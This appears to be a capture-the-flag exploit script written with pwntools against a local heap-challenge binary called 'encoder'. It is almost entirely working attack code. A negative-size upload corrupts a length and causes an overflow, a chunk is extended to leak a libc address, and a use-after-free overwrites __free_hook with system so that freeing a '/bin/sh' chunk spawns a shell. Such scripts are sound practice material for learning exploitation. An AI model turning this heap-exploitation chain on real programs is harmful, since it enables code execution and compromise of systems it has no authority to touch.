from pwn import *
#context(os='linux', arch='mips',endian="little", log_level='debug')
context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='amd64')
context.terminal = ['tmux', 'sp', '-h']
       
rv = lambda x            : io.recv(x)
rl = lambda a=False      : io.recvline(a)
ru = lambda a,b=True     : io.recvuntil(a,b)
rn = lambda x            : io.recvn(x)
sd = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b          : io.sendafter(a,b)
sla = lambda a,b         : io.sendlineafter(a,b)
inter = lambda           : io.interactive()

file_name = "./encoder"
elf=ELF(file_name)
url = ""
port = 0
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
def debug(filename = file_name,b_slice=[],is_pie=0,is_start = 1):
    global io
    b_string = ""
    if is_pie:
        for i in b_slice:
            b_string += f"b *$rebase({i})\n"
        for i in range(1,2):
            b_string += f"c\n"
    else:
        for i in b_slice:
            b_string += f"b *{hex(i)}\n"
    if is_start :
        io = gdb.debug(filename,b_string)
        return
    else:
        gdb.attach(io,b_string)
        pause()

b_encode=0x1dab
b_slice = [
    b_encode
]
io = process(file_name)
debug(b_slice = b_slice,is_pie=1,is_start=1) 


def cha(num):
    return str(num).encode()

def get_addr(arch):
    if arch == 64:
        return u64(io.recv(6).ljust(8,b'\x00'))
        #return u64(io.recv()[-8:].ljust(8,b'\x00')) 
    else:
        return u32(p.recv(4).ljust(4,b'\x00'))
        #return u32(io.recvuntil(b'\xf7')
def menu(choice):
	sla(b'>>\n',str(choice))
def upload(index,Size,content):
	menu(1)
	sla(b'FileIdx:',str(index).encode())
	sla(b'FileSize:',str(Size).encode())
	sa(b'FileData',content)
def enc(index):
	menu(3)
	sla(b'FileIdx:',str(index).encode())
def dec(index):
	menu(4)
	sla(b'FileIdx:',str(index).encode())
def show(index):
	menu(2)
	sla(b'FileIdx:',str(index).encode())
def free(index):
	menu(5)
	sla(b'FileIdx:',str(index).encode())


upload(0,0x20,b'a'*0x20)
upload(1,0x20,b'b'*0x20)
upload(2,0x450,b'c'*0x450)
upload(3,0x20,b'd'*0x20)

upload(0, -1, b'a'*0x10)
upload(0, 0x30, b'a'*0x28+p64(0x51)) #len已经被修改，越界写1，造成chunk_extent
free(1)

upload(1, 0x40, b'a'*0x20+p64(0)+p64(0x461)+b'a'*0x10)  #补0x40个数据 

free(2)
show(1)

ru(b'FileData: ')
a=io.recv(48)
libcbase = get_addr(64) - (0x7f46f398fbe0-0x7f46f37a3000)
system = libcbase + libc.sym['system']
free_hook = libcbase + libc.sym['__free_hook']

#upload(4,0x20,b'a'*0x10+b'c'*0x10) 
upload(4,0x20,b'a'*0x8+b'c'*0x8+b'b'*0x8+b'd'*0x8)
enc(4)      
enc(3)  
upload(3,0x8,p64(free_hook))    #uaf覆写指针到free_hook
upload(5,0x20,b'/bin/sh\x00'*4)  #构造参数
upload(6,0x20,p64(system)+p64(0)*3) #任意申请内存
free(5)
inter()